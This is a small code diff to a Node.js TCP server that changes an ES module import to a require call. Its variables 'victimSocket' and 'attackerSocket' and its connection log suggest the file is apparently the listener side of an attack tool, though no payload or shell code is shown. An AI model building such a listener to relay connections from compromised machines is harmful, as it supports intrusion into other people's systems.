@@ -1,4 +1,4 @@
-import { createServer } from "net";
+const net = require("net");
 
 // Server configuration
 const SERVER_PORT = 4000;
@@ -6,7 +6,7 @@ var victimSocket;
 var attackerSocket;
 
 // Create a TCP server
-const server = createServer((socket) => {
+const server = net.createServer((socket) => {
   console.log(
     `[*] connected from ${socket.remoteAddress}:${socket.remotePort}`
   );
